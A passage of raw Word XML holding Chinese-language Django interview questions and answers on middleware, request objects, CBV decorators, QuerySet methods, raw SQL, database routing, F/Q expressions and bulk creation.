        </w:rPr>
        <w:t>个方法？以及</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中间件的应用场景？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FE6655"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这些方法中的参数都是与视图函数参数对应的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B26532" w14:textId="18654B1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process_request(self, request)  主要方法。请求刚进来时，执行视图函数之前调用。(无return)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E0D53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process_view(self, request, callback, callback_args, callback_kwargs)　　URL路由匹配成功后，执行视图函数之前调用，拿到视图函数对象，及其所有参数。(无return)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7760F66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process_exception(self, request, exception)　　执行视图函数中遇到异常时调用。(无return)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD9893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process_template_response(self, request, response)　　很少用。执行了render()渲染方法后调用。(有return)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D71B4A8"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process_response(self, request, response)　　主要方法。执行视图函数结束之后有响应时调用。(有return)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2C7B48" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="001E7149">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>执行流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B824282" w14:textId="77777777" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="001E7149" w:rsidP="001E7149">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drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0FE71C8B" wp14:editId="303EC3C8">
            <wp:extent cx="8458956" cy="1641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30804" cy="1713633"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE5C2C4"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26.Django</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request</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象是在什么时候创建的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6DC9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当请求一个页面时, Django会建立一个包含请求元数据的HttpRequest对象。当Django加载对应的视图时, HttpRequest对象将作为视图函数的第一个参数，另外每个视图会返回一个HttpResponse对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACA78AC"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27.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何给</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的程序添加装饰器？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1484050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利用方法装饰器"</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>method_decorator</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C0926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auth(func):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BDB5F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inner(*args,**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F992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func(*args,**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526F67B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inner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EA06E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UserView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B18CE8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r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>@method_decorator</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(auth)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B8B4E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get(self,request,*args,**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5600551C"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HttpResponse('...')    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CDFBB2"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28.</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 ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中的方法（</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>QuerySet</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对象的方法）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A3DC46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1.返回QuerySet对象的方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA4ED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all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38439C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filter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D3E7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exclude()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2063CE7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order_by()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF3BB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reverse()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6E3EED"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distinct()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFEF343"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select_related()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C52CEC"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prefetch_related()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4275FE98"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only()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1005259F"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defer()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3478F095" w14:textId="43B4F418"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using()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB24BB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特殊的QuerySet：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390E64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values()       (返回一个字典序列)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782B7F4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values_list()  (返回一个元组序列)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BE5F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2.不返回QuerySet，而返回具体对象的方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7488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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A974E6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first()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6074FA2C"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last()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76385B9C"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earliest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3C6243"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latest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5461E606"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update()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A88FC7" w14:textId="5D92660D"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delete()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A0998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返回布尔值的方法有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362E16B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exists()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212A92C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返回数字的方法有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794D680E"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count() </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299DCEC8"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29.only()</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defer()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2612A58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only()查询指定的字段，defer()查询排除指定的字段。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3463E6FC"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30.select_related('</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[__</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 xml:space="preserve">]') </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 xml:space="preserve"> prefetch_related('</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[__</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的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8AC136"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相同点：它俩都用于连表查询，缓存查询结果，减少SQL查询次数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A10FF6" w14:textId="4AC26432"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不同点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78EE35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select_related 主要针对一对一和一对多关系进行优化。通过多表join关联查询，一次性获得所有数据，缓存在内存中，但如果关联的表太多，会严重影响数据库性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6599509F"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prefetch_related 主要针对多对多关系进行优化。通过分表，先获取各个表的数据，缓存在内存中，然后通过Python处理他们之间的关联。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B6C265"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31.filter()</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exclude()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4C865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filter(self, *args, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CA95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 条件查询(符合条件)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E14C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查出符合条件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2943E7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条件可以是：参数，字典，Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D034E9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exclude(self, *args, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EAB62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条件查询(排除条件)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315B7C1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排除不想要的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB56557"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条件可以是：参数，字典，Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FD774C"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32.</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 ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>种能写</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>语句的方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D67D6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靠近原生SQL --&gt; extra()、raw()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F955CE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extra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401A52F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extra(self, select=None, where=None, params=None, tables=None, order_by=None, select_params=None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CED1B3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构造额外的查询条件或者映射，如：子查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3A6FF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Entry.objects.extra(select={'new_id': "select col from sometable where othercol &gt; %s"}, select_params=(10,))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE52B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Entry.objects.extra(where=['headline=%s'], params=['Lennon'])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BAC5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Entry.objects.extra(where=["foo='a' OR bar = 'a'", "baz = 'a'"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793E20C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Entry.objects.extra(select={'new_id': "select id from tb where id &gt; %s"}, select_params=(10,), order_by=['-nid'])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7BCB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raw </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B37244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raw(self, raw_query, params=None, translations=None, using=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D77AD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执行原生SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733F75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 from userinfo')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649720C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如果SQL是其他表时，必须将名字设置为当前UserInfo对象的主键列名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D21E8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id as nid,name as title  from 表')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEA1AE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为原生SQL设置参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F15EA8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id as nid from userinfo where nid&gt;%s', params=[12,])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D401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将获取的到列名转换为指定列名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4F789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name_map = {'first': 'first_name', 'last': 'last_name', 'bd': 'birth_date', 'pk': 'id'}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D249C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Person.objects.raw('SELECT * FROM some_other_table', translations=name_map)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7364C9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指定数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C8AAA44"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 from userinfo', using="default")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB2EE1C"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33.Django ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中如何设置读写分离？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6165884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步骤一：写配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2AF3F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Router1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDE76E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指定到某个数据库读数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A84D89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db_for_read(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3575A3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if model._meta.model_name == 'usertype':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D0B312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'db1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3169E45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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466892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'default'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734865B7"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4CDDB7E" w14:textId="4C22EF6F"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指定到某个数据库写数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586A42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db_for_write(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F8C88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'default'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D5A32B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再写到配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1859234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DATABASES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAA16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'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E330A2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'ENGINE': 'django.db.backends.sqlite3',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1719A1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 os.path.join(BASE_DIR, 'db.sqlite3'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D51FCC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5D5C457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'db1': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E3111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'ENGINE': 'django.db.backends.sqlite3',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D13BE8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 os.path.join(BASE_DIR, 'db.sqlite3'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19802D3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65533B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453175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DATABASE_ROUTERS = ['db_router.Router1',]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15678ED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步骤二：手动使用queryset的using方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DFA0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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E26CD0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models.UserType.objects.using('db1').create(title='普通用户')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11935E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手动指定去某个数据库取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D987FD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result = models.UserType.objects.all().using('db1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E6E05D8"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HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE31107"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34.F</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Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>表达式的作用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="472D3804"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F：主要用来对字段的值进行四则计算。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B11000D" w14:textId="3B730901"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Goods.objects.update(price=F("price")+10)  # 对于goods表中每件商品的价格都在原价格的基础上增加10元</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DA79F1"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Q：用来进行复杂查询，实现"与"、"或"、"非"查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050DA936"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Q(条件1) | Q(条件2) 　　# 或</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D38EF24"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Q(条件1) &amp; Q(条件2) 　　# 且</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="463BC9A4" w14:textId="7821369C"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Q(条件)　　　　　　　　# 非</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB36706" w14:textId="4C6288E4" w:rsidR="001E7149" w:rsidRPr="00BF3003" w:rsidRDefault="00B3732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lastRenderedPageBreak/>
        <w:t>035</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values()</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>values_list()</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4384583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values(self, *fields):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473882A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返回每行数据为字典格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF9309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values_list(self, *fields, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCAB8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返回每行数据为元组格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1E5CB0" w14:textId="0B0952DD" w:rsidR="001E7149" w:rsidRPr="001A250B" w:rsidRDefault="00B3732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036</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如何使用</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django ORM</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>批量创建数据？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D6BBF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r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bulk_create</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(objs, batch_size=None)：批量插入</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F56EC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batch_size表示一次插入的个数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A6F0A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objs = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6A168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models.DDD(name='r11'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03EFCC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models.DDD(name='r22')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217E99B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10DAF9B7"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models.DDD.objects.</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bulk_create</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(objs, 10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAA8FDD" w14:textId="21CDCEC3" w:rsidR="001E7149" w:rsidRPr="001A250B" w:rsidRDefault="00B3732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037</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的</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ModeForm</w:t>
      </w:r>
      <w:r w:rsidR="001E7149" w:rsidRPr="00BF3003">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
